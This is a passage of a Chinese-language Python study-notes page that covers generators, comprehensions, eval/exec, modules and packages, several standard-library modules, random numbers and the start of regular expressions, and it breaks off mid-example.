title="22.生成器"></a>22.生成器</h3><p>调用生成器返回的是一个迭代器对象</p><p>手动生成</p><p>出现yield先执行到yield之前</p><p>当next(g1)进行return a的操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_fun1</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;将a赋值&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> a<span class="comment">#中断函数，return a，等待下一个next才会继续执行</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;将b赋值&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> b</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    g1 = gen_fun1()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(g1))<span class="comment">#执行到yield结束</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(g1))<span class="comment">#继续执行</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>自动生成</p><p>法1：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">produce</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&quot;生产了%s个包子&quot;</span>%(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = produce()</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:  <span class="comment"># 此时p.__next__()就是i</span></span><br><span class="line">        <span class="built_in">print</span>(i)  <span class="comment"># 相当于调用了yield</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>法2：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">produce</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&quot;生产了%s个包子&quot;</span>%(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = produce()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="built_in">print</span>(p.__next__())<span class="comment">#调用yield</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="23-yield传入参数"><a href="#23-yield传入参数" class="headerlink" title="23.yield传入参数"></a>23.yield传入参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">123</span>)</span><br><span class="line">    content = <span class="keyword">yield</span> <span class="number">1</span> <span class="comment">#中断函数，return 1,外面send的内容给content</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========&quot;</span>,content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">456</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    g = gen()</span><br><span class="line">    ret1 = g.__next__()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ret1 is&quot;</span>,ret1)</span><br><span class="line">    re2 = g.send(<span class="string">&quot;haha i am coming&quot;</span>)<span class="comment">#给第一个yield发东西，发完自动执行next</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ret2 is&quot;</span>,re2)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="24-各种推导式"><a href="#24-各种推导式" class="headerlink" title="24.各种推导式"></a>24.各种推导式</h3><p>列表推导式</p><p>0-30以内能被三整除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    mul = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>) <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(mul)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>函数列表推导式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">squard</span>(<span class="params">x</span>):</span><br><span class="line"><span class="keyword">return</span> x*x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    mul = [squard(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>) <span class="keyword">if</span> i%<span class="number">3</span>== <span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(mul)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>找到嵌套列表中找到2个a字母的水果名字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fruits = [[<span class="string">&#x27;applea&#x27;</span>,<span class="string">&#x27;banana&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>,<span class="string">&#x27;almond&#x27;</span>,<span class="string">&#x27;date&#x27;</span>,<span class="string">&#x27;coconut&#x27;</span>],[<span class="string">&#x27;fig&#x27;</span>,<span class="string">&#x27;hazel&#x27;</span>,<span class="string">&#x27;grape&#x27;</span>,<span class="string">&#x27;haw&#x27;</span>,<span class="string">&#x27;geengage&#x27;</span>]]</span><br><span class="line">    <span class="built_in">print</span>([name <span class="keyword">for</span> lst <span class="keyword">in</span> fruits <span class="keyword">for</span> name <span class="keyword">in</span> lst <span class="keyword">if</span> name.count(<span class="string">&#x27;a&#x27;</span>)&gt;=<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>字典推导式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dic1 = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">    dic2 = &#123;dic1[k]:k <span class="keyword">for</span> k <span class="keyword">in</span> dic1&#125;</span><br><span class="line">    <span class="built_in">print</span>(dic2)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>集合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,-<span class="number">1</span>,-<span class="number">2</span>]</span><br><span class="line">    s = &#123;x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> li&#125;</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="25-执行函数"><a href="#25-执行函数" class="headerlink" title="25.执行函数"></a>25.执行函数</h3><p>把文字，字符串当作python代码执行</p><p>eval:执行字符串所代表的代码，并且返回结果</p><p>eval很危险！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = <span class="string">&#x27;print(&quot;haha&quot;)&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="built_in">eval</span>(s)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>exec</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = <span class="string">&#x27;os.system(&quot;ipconfig&quot;)&#x27;</span></span><br><span class="line">    <span class="built_in">exec</span>(s)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="26-模块"><a href="#26-模块" class="headerlink" title="26.模块"></a>26.模块</h3><p>每一个python文件都是一个模块</p><p>（对于python起的文件名必须避开关键字！）</p><p>test123内</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i am test1&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i am test2 &quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>test1引用test123文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> test123</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    test123.fun1()</span><br><span class="line">    test123.fun2()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>引用test123中的所有函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#引入test123中的所有函数</span></span><br><span class="line"><span class="keyword">from</span> test123 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1()</span><br><span class="line">    fun2()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>只需要引用fun1</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test123 <span class="keyword">import</span> fun1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>取别名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> test123 <span class="keyword">as</span> nn<span class="comment">#给test123引入后取一个别名叫做nn</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    nn.fun2()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>test123中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__all__=[<span class="string">&#x27;fun1&#x27;</span>,<span class="string">&#x27;fun3&#x27;</span>]<span class="comment">#他人引用你的时候最多只能用fun1和fun3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i am test123---fun1&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun2</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i am test123---fun2&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun3</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i am test123---fun3&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="27-包"><a href="#27-包" class="headerlink" title="27.包"></a>27.包</h3><p>在项目文件夹下创建一个文件夹，在该文件中创建</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__init__.py#!!!一定要创建</span><br></pre></td></tr></table></figure><p>python会将该文件夹识别为一个包</p><p>引入包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pa.test123</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">pa.test123.fun1()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="28-python自带模块"><a href="#28-python自带模块" class="headerlink" title="28.python自带模块"></a>28.python自带模块</h3><p>json模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dic = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="string">&#x27;v1&#x27;</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="string">&#x27;v2&#x27;</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="string">&#x27;v3&#x27;</span>&#125;</span><br><span class="line">    <span class="comment">#将一个字典转换为字符串</span></span><br><span class="line">    <span class="built_in">str</span> = json.dumps(dic)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(dic))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">str</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">    <span class="comment">#反序列化</span></span><br><span class="line">    dic2 = json.loads(<span class="built_in">str</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(dic2))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>md5模块,md5可以用来加密也可以用来提取hash值，加密模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    md5 = hashlib.md5()<span class="comment">#使用md5对以后的数据进行摘要加密</span></span><br><span class="line">    md5.update((<span class="string">&#x27;hahanihao&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#对目标进行操作（对字符串进行加密之前要转为utf-8）</span></span><br><span class="line">    <span class="built_in">print</span>(md5.hexdigest())<span class="comment">#结果就是字符串md5加密后的密文</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#初始化</span></span><br><span class="line">    conf = configparser.ConfigParser()</span><br><span class="line">    <span class="comment">#默认配置</span></span><br><span class="line">    conf[<span class="string">&#x27;default&#x27;</span>] = &#123;<span class="string">&#x27;money&#x27;</span>:<span class="number">100</span>,<span class="string">&#x27;go&#x27;</span>:<span class="string">&#x27;yes&#x27;</span>,<span class="string">&#x27;weapon&#x27;</span>:<span class="string">&#x27;no&#x27;</span>&#125;</span><br><span class="line">    conf[<span class="string">&#x27;home&#x27;</span>] = &#123;<span class="string">&#x27;island&#x27;</span>:<span class="string">&#x27;xiaodao1&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./config&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        conf.write(f)<span class="comment">#配置文件的写入</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>读取配置文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    conf = configparser.ConfigParser()</span><br><span class="line">    conf.read(<span class="string">&#x27;config&#x27;</span>)  <span class="comment"># 读取配置文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;home&#x27;</span> <span class="keyword">in</span> conf)  <span class="comment"># 判断home是否在conf内</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> conf[<span class="string">&#x27;default&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取对应的值</span></span><br><span class="line">    <span class="built_in">print</span>(conf.get(<span class="string">&#x27;default&#x27;</span>, <span class="string">&#x27;money&#x27;</span>))</span><br><span class="line">    <span class="comment"># 获取所有的键值对</span></span><br><span class="line">    <span class="built_in">print</span>(conf.items(<span class="string">&#x27;default&#x27;</span>))  <span class="comment"># 获取defalut里的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取所有的键(列表)</span></span><br><span class="line">    <span class="built_in">print</span>(conf.options(<span class="string">&#x27;default&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 增加一个键</span></span><br><span class="line">    conf.add_section(<span class="string">&#x27;tank&#x27;</span>)</span><br><span class="line">    conf.write(<span class="built_in">open</span>(<span class="string">&#x27;conf.new&#x27;</span>, <span class="string">&#x27;w&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除键</span></span><br><span class="line">    conf.remove_section(<span class="string">&#x27;home&#x27;</span>)</span><br><span class="line">    conf.write(<span class="built_in">open</span>(<span class="string">&#x27;conf.new&#x27;</span>, <span class="string">&#x27;w&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除条目</span></span><br><span class="line">    conf.remove_option(<span class="string">&#x27;default&#x27;</span>, <span class="string">&#x27;weapon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改条目</span></span><br><span class="line">    conf.<span class="built_in">set</span>(<span class="string">&#x27;default&#x27;</span>, <span class="string">&#x27;money&#x27;</span>, <span class="string">&#x27;199&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>定义坐标系</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    point = namedtuple(<span class="string">&#x27;point&#x27;</span>,[<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>])<span class="comment">#定义名字为point的坐标并且坐标有两个参数叫x,y</span></span><br><span class="line">    p = point(<span class="number">20</span>,<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.x)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>时间模块！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    time.sleep(<span class="number">2</span>)  <span class="comment"># 睡两秒钟</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(time.time())  <span class="comment"># 输出当前的时间戳（从1970-1-1 0:0:0一直到现在的秒数）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d %X&#x27;</span>))  <span class="comment"># 输出当前的24h的时间</span></span><br><span class="line">    <span class="built_in">print</span>(time.strftime(<span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>))  <span class="comment"># 另一种24h输出方式</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>日期模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 显示当前日期时间</span></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    <span class="built_in">print</span>(now)  <span class="comment"># 甚至可以输出到当前的秒数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3周后</span></span><br><span class="line">    <span class="built_in">print</span>(datetime.datetime.now() + datetime.timedelta(weeks=<span class="number">3</span>))</span><br><span class="line">    <span class="comment"># 3秒后</span></span><br><span class="line">    <span class="built_in">print</span>(datetime.datetime.now() + datetime.timedelta(seconds=<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调整时间</span></span><br><span class="line">    <span class="built_in">print</span>(now.replace(year=<span class="number">1977</span>, month=<span class="number">2</span>, day=<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 时间戳转为当前时间</span></span><br><span class="line">    sjc = time.time()</span><br><span class="line">    <span class="built_in">print</span>(datetime.date.fromtimestamp(sjc))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="29-随机数"><a href="#29-随机数" class="headerlink" title="29.随机数"></a>29.随机数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#输出0-1之间的小数</span></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line">    <span class="comment">#取0-4之间的小数</span></span><br><span class="line">    <span class="built_in">print</span>(random.uniform(<span class="number">0</span>,<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#取1-5之间的整数</span></span><br><span class="line">    <span class="built_in">print</span>(random.randint(<span class="number">1</span>,<span class="number">5</span>))</span><br><span class="line">    <span class="comment">#取1-10之间的奇数</span></span><br><span class="line">    <span class="built_in">print</span>(random.randrange(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line">    <span class="comment">#取1-10之间的偶数</span></span><br><span class="line">    <span class="built_in">print</span>(random.randrange(<span class="number">2</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#随机选择一张牌（列表中内容）</span></span><br><span class="line">    ret = random.choice([<span class="string">&#x27;梅花4&#x27;</span>,<span class="string">&#x27;黑桃q&#x27;</span>,<span class="string">&#x27;方块k&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#随机选择两张牌</span></span><br><span class="line">    a,b = random.sample([<span class="string">&#x27;梅花A&#x27;</span>,<span class="string">&#x27;梅花2&#x27;</span>,<span class="string">&#x27;梅花3&#x27;</span>,<span class="string">&#x27;梅花4&#x27;</span>,<span class="string">&#x27;方块A&#x27;</span>],<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(a,b)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#洗牌</span></span><br><span class="line">    item = [<span class="string">&#x27;梅花A&#x27;</span>,<span class="string">&#x27;梅花2&#x27;</span>,<span class="string">&#x27;梅花3&#x27;</span>,<span class="string">&#x27;梅花4&#x27;</span>,<span class="string">&#x27;方块A&#x27;</span>]</span><br><span class="line">    random.shuffle(item)</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p>写验证码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">v_code</span>():</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">        alf = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>,<span class="number">90</span>))<span class="comment">#char（ascii码）</span></span><br><span class="line">        add = random.choice([num,alf])<span class="comment">#在数字和A-Z字母中随便选一个</span></span><br><span class="line">        code = <span class="string">&quot;&quot;</span>.join([code,<span class="built_in">str</span>(add)])<span class="comment">#加入到code里面</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yzm = v_code()</span><br><span class="line">    <span class="built_in">print</span>(yzm)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="30-正则表达式"><a href="#30-正则表达式" class="headerlink" title="30.正则表达式"></a>30.正则表达式</h3><p>寻找jkl</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = <span class="string">r&#x27;jkl&#x27;</span> <span class="comment">#s是正则表达式，寻找jkl</span></span><br><span class="line">    str1 = <span class="string">&quot;abcdefghijklmn12345&quot;</span><span class="comment">#目标</span></span><br><span class="line">    <span class="built_in">print</span>(re.findall(s,str1))<span class="comment">#找到东西会把其变为list的形式存在    </span></span><br></pre></td></tr></table></figure><p>寻找top或tip</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = <span class="string">r&#x27;t[io]p&#x27;</span> <span class="comment">#s是正则表达式，寻找top或tip</span></span><br><span class="line">    str1 = <span class="string">&quot;this is a top secret and tip is ah&quot;</span><span class="comment">#目标</span></span><br><span class="line">    <span class="built_in">print</span>(re.findall(s,str1))<span class="comment">#找到东西会把其变为list的形式存在    </span></span><br></pre></td></tr></table></figure><p>寻找开头结尾</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = <span class="string">r&#x27;^abc&#x27;</span>  <span class="comment"># 寻找以abc开头的东西</span></span><br><span class="line">    str1 = <span class="string">&quot;abc defjak asd sdod abcde&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(re.findall(s, str1))</span><br><span class="line">    <span class="comment"># 判断以什么结尾</span></span><br><span class="line">    s = <span class="string">r&#x27;aa$&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">r&#x27;^d\$e&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;d$efg hijk dsalfj dfasdofaij&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s,str1))</span><br></pre></td></tr></table></figure><p>寻找数字</p><p>d是寻找所有数字</p><p>D是寻找所有非数字</p><p>s是寻找所有的空字符</p><p>S是寻找所有非空字符</p><p>w是匹配所有字母和数字</p><p>W是匹配所有符号空格</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">r&#x27;\d&#x27;</span></span><br><span class="line">s2 = <span class="string">r&#x27;\D&#x27;</span></span><br><span class="line">s3 = <span class="string">r&#x27;\s&#x27;</span></span><br><span class="line">s4 = <span class="string">r&#x27;\S&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;12jklad1d1lj21ls a aSd a sd asdas13 r43&quot;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(s1,str1))</span><br><span class="line"><span class="built_in">print</span>(re.findall(s2,str1))</span><br><span class="line"><span class="built_in">print</span>(re.findall(s3,str1))</span><br><span class="line"><span class="built_in">print</span>(re.findall(s4,str1))</span><br></pre></td></tr></table></figure><p>匹配电话号码</p><p>\d{3}匹配3位数字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span 